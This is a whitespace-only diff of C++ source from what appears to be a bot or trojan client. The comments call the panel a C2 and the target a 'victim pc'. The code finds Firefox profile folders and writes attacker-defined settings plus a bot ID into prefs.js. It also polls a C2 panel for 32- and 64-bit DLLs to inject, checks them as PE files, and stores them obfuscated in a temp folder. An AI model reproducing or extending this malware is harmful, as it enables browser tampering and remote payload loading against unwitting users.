@@ -256,53 +256,53 @@ DWORD GetPidExplorer()
 void SetFirefoxPrefs()
 {
    char appData[MAX_PATH];
-   if(Funcs::pExpandEnvironmentStringsA(Strs::exp1, appData, MAX_PATH) > 0)						// gets user-specific path to appdata folder
+   if(Funcs::pExpandEnvironmentStringsA(Strs::exp1, appData, MAX_PATH) > 0)                     // gets user-specific path to appdata folder
    {
       char ffDir[MAX_PATH];
-      Funcs::pWsprintfA(ffDir, Strs::exp2, appData, Strs::exp3, Strs::exp4, Strs::exp5);		// writes "%appdata%\Mozilla\Firefox\Profiles.ini" to buffer
-      if(ffDir)																					
+      Funcs::pWsprintfA(ffDir, Strs::exp2, appData, Strs::exp3, Strs::exp4, Strs::exp5);        // writes "%appdata%\Mozilla\Firefox\Profiles.ini" to buffer
+      if(ffDir)                                                                                 
       {
          char sections[1024] = { 0 };
-         if(Funcs::pGetPrivateProfileSectionNamesA(sections, sizeof(sections), ffDir) > 0)		// gets all sections from Profiles.ini (one or
-         {																						// more null-terminated strings)
+         if(Funcs::pGetPrivateProfileSectionNamesA(sections, sizeof(sections), ffDir) > 0)      // gets all sections from Profiles.ini (one or
+         {                                                                                      // more null-terminated strings)
             char *entry = sections;
             for(;;)
             {
-               if(Funcs::pStrncmp(entry, Strs::exp6, 7) == 0)									// if entry equals "Profile"
+               if(Funcs::pStrncmp(entry, Strs::exp6, 7) == 0)                                   // if entry equals "Profile"
                {  
                   char randomDir[MAX_PATH]; 
-                  if(Funcs::pGetPrivateProfileStringA(entry, Strs::exp7, 0, randomDir, MAX_PATH, ffDir) > 0)	
-                  {																				// receives a value by key "path" in section "Profile" and
-                     int nPos = 0;																// checks if it worked by comparing to 0
+                  if(Funcs::pGetPrivateProfileStringA(entry, Strs::exp7, 0, randomDir, MAX_PATH, ffDir) > 0)    
+                  {                                                                             // receives a value by key "path" in section "Profile" and
+                     int nPos = 0;                                                              // checks if it worked by comparing to 0
                      for(; nPos < 64; ++nPos)
                      {
                         if(randomDir[nPos] == '/')
                         {
                            Funcs::pMemcpy(randomDir, randomDir + nPos + 1, (sizeof randomDir - nPos) + 1);
-                           break;																// randomDir, nothing to say
+                           break;                                                               // randomDir, nothing to say
                         }
                      }
                      Funcs::pMemset(ffDir, 0, MAX_PATH);
    
-                     Funcs::pWsprintfA(ffDir, Strs::exp8, appData,								// writes the folowing path to buffer:
-                          Strs::exp3,  Strs::exp4, Strs::exp5, randomDir, Strs::exp9);			// %appdata%\Mozilla\Firefox\Profiles\RandomDir\prefs.js
+                     Funcs::pWsprintfA(ffDir, Strs::exp8, appData,                              // writes the folowing path to buffer:
+                          Strs::exp3,  Strs::exp4, Strs::exp5, randomDir, Strs::exp9);          // %appdata%\Mozilla\Firefox\Profiles\RandomDir\prefs.js
              
                      if(ffDir)
                      {
-                        HANDLE ffPrefs = Funcs::pCreateFileA								
+                        HANDLE ffPrefs = Funcs::pCreateFileA                                
                         (
                            ffDir, GENERIC_READ | GENERIC_WRITE, 0, 0, 
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
-                        );																		// success if file already exists
+                        );                                                                      // success if file already exists
                 
-                        if(ffPrefs != INVALID_HANDLE_VALUE)										//
+                        if(ffPrefs != INVALID_HANDLE_VALUE)                                     //
                         {
                            DWORD fileSize = Funcs::pGetFileSize(ffPrefs, NULL);
-                           char *fBuffer  = (CHAR *) Alloc(fileSize + 1);						// allocates space for a new buffer
+                           char *fBuffer  = (CHAR *) Alloc(fileSize + 1);                       // allocates space for a new buffer
                            DWORD bRead, bWritten;
                            if(Funcs::pReadFile(ffPrefs, fBuffer, fileSize, &bRead, NULL) == TRUE)
-                           {																	// reads file into buffer
-                              fBuffer[bRead] = '\0';											// puts terminator at the end
+                           {                                                                    // reads file into buffer
+                              fBuffer[bRead] = '\0';                                            // puts terminator at the end
 
                               char botId[BOT_ID_LEN] = { 0 };
                               GetBotId(botId);
@@ -310,25 +310,25 @@ void SetFirefoxPrefs()
                               char botIdComment[BOT_ID_LEN + 10] = { 0 };
                               botIdComment[0] = '#';
                               Funcs::pLstrcatA(botIdComment, botId);
-                              Funcs::pLstrcatA(botIdComment, Strs::winNewLine);					// botid + '#' + newline
+                              Funcs::pLstrcatA(botIdComment, Strs::winNewLine);                 // botid + '#' + newline
 
                               if(!Funcs::pStrStrA(fBuffer, botIdComment))
-                              {																	// exp12 is put into prefs.js (changes to be made to Firefox settings)
+                              {                                                                 // exp12 is put into prefs.js (changes to be made to Firefox settings)
                                  Funcs::pWriteFile(ffPrefs, Strs::exp12, Funcs::pLstrlenA(Strs::exp12), &bWritten, NULL);
                                  Funcs::pWriteFile(ffPrefs, botIdComment, Funcs::pLstrlenA(botIdComment), &bWritten, NULL);
                               }
-                              Funcs::pCloseHandle(ffPrefs);										// closes handle if exp12 are written to prefs.js
+                              Funcs::pCloseHandle(ffPrefs);                                     // closes handle if exp12 are written to prefs.js
                               return;
                            }  
-                           Funcs::pFree(fBuffer);											
+                           Funcs::pFree(fBuffer);                                           
                         }
-                        Funcs::pCloseHandle(ffPrefs);											// closes handle if no prefs.js found
+                        Funcs::pCloseHandle(ffPrefs);                                           // closes handle if no prefs.js found
                         return;
                      }
                   }
                }
-               entry += Funcs::pLstrlenA(entry) + 1;											// continues search if "Profile" section is not found yet
-               if(!entry[0])																	// stops if no sections left
+               entry += Funcs::pLstrlenA(entry) + 1;                                            // continues search if "Profile" section is not found yet
+               if(!entry[0])                                                                    // stops if no sections left
                   break; 
             }
          }
@@ -409,31 +409,31 @@ static BYTE *ReadDll(char *path, char *botId)
       FILE_ATTRIBUTE_NORMAL, 
       NULL
    );
-   if(hFile == INVALID_HANDLE_VALUE)															// can't open file for reading
+   if(hFile == INVALID_HANDLE_VALUE)                                                            // can't open file for reading
       return NULL;
 
    DWORD fileSize = Funcs::pGetFileSize(hFile, NULL);
    if(fileSize < 1024)
       return NULL;
 
-   BYTE *contents = (BYTE *) Alloc(fileSize);													// dynamically allocates bytes
+   BYTE *contents = (BYTE *) Alloc(fileSize);                                                   // dynamically allocates bytes
    DWORD read;
-   Funcs::pReadFile(hFile, contents, fileSize, &read, NULL);									// receives file's data into contents
-   Obfuscate(contents, fileSize, botId);														// deobfuscates
-   if(!VerifyPe(contents, fileSize))															
+   Funcs::pReadFile(hFile, contents, fileSize, &read, NULL);                                    // receives file's data into contents
+   Obfuscate(contents, fileSize, botId);                                                        // deobfuscates
+   if(!VerifyPe(contents, fileSize))                                                            
    {
       Funcs::pFree(contents);
       contents = NULL;
    }
    Funcs::pCloseHandle(hFile);
-   return contents;																				// file's data if success, NULL otherwise
+   return contents;                                                                             // file's data if success, NULL otherwise
 }
 
 static void DownloadDll(char *path, BOOL x64, char *botId)
 {
    char command[32] = { 0 };
    if(!x64)
-      Funcs::pLstrcpyA(command, Strs::dll32binRequest);											// command contains "bin|int32"
+      Funcs::pLstrcpyA(command, Strs::dll32binRequest);                                         // command contains "bin|int32"
    else
       Funcs::pLstrcpyA(command, Strs::dll64binRequest);
 
@@ -441,14 +441,14 @@ static void DownloadDll(char *path, BOOL x64, char *botId)
    BYTE *dll;
    for(;;)
    {
-      dll = (BYTE *) PanelRequest(command, &dllSize);										    // dll contains data to be injected 
-      if(VerifyPe(dll, dllSize))																// checks if dll is large enough, if is starts with "MZ"
+      dll = (BYTE *) PanelRequest(command, &dllSize);                                           // dll contains data to be injected 
+      if(VerifyPe(dll, dllSize))                                                                // checks if dll is large enough, if is starts with "MZ"
          break;
-      Funcs::pFree(dll);																		// cleans garbage if unsuccessful
+      Funcs::pFree(dll);                                                                        // cleans garbage if unsuccessful
       Funcs::pSleep(POLL);
    }
-   Obfuscate(dll, dllSize, botId);																// obfuscates dll to safely store it on a victim pc
-   HANDLE hFile = Funcs::pCreateFileA															// allocates memory for the obfuscated dll
+   Obfuscate(dll, dllSize, botId);                                                              // obfuscates dll to safely store it on a victim pc
+   HANDLE hFile = Funcs::pCreateFileA                                                           // allocates memory for the obfuscated dll
    (
       path, 
       GENERIC_WRITE, 
@@ -459,7 +459,7 @@ static void DownloadDll(char *path, BOOL x64, char *botId)
       NULL
    );
    DWORD written;
-   Funcs::pWriteFile(hFile, dll, dllSize, &written, NULL);										// writes dll into memory
+   Funcs::pWriteFile(hFile, dll, dllSize, &written, NULL);                                      // writes dll into memory
    Funcs::pCloseHandle(hFile);
    Funcs::pFree(dll);
 }
@@ -484,31 +484,31 @@ void GetDlls(BYTE **x86, BYTE **x64, BOOL update)
    SYSTEM_INFO info            = { 0 };
 
    GetBotId(botId);
-   Funcs::pGetNativeSystemInfo(&info);															// on versions under XP GetSystemInfo used instead
+   Funcs::pGetNativeSystemInfo(&info);                                                          // on versions under XP GetSystemInfo used instead
 
-   GetTempPathBotPrefix(cachePath);																// a temp folder for dlls
+   GetTempPathBotPrefix(cachePath);                                                             // a temp folder for dlls
    Funcs::pLstrcpyA(x86cachePath, cachePath);
    Funcs::pLstrcatA(x86cachePath, Strs::dll32cachePrefix);
 
-   if(update)																					// this branchs is used to update old x86 dll from C2
+   if(update)                                                                                   // this branchs is used to update old x86 dll from C2
    {
-      Funcs::pCloseHandle(hX86);																// close the old handle to create a new one
+      Funcs::pCloseHandle(hX86);                                                                // close the old handle to create a new one
       DownloadDll(x86cachePath, FALSE, botId);
       hX86 = Funcs::pCreateFileA(x86cachePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    }
    else
    {
-      while(!(*x86 = ReadDll(x86cachePath, botId)))											    // otherwise, tries to download the dll from C2
+      while(!(*x86 = ReadDll(x86cachePath, botId)))                                             // otherwise, tries to download the dll from C2
          DownloadDll(x86cachePath, FALSE, botId);
    }
 
    if(info.wProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64 || (x64 == NULL && !update))  // doesn't update or download an x64 dll if
-      return;																					// os doesn't support x64 or if its not required
+      return;                                                                                   // os doesn't support x64 or if its not required
 
    Funcs::pLstrcpyA(x64cachePath, cachePath);
    Funcs::pLstrcatA(x64cachePath, Strs::dll64cachePrefix);
-	
-   if(update)																					// similar to x86 download process above
+    
+   if(update)                                                                                   // similar to x86 download process above
    {
       Funcs::pCloseHandle(hX64);
       DownloadDll(x86cachePath, TRUE, botId);
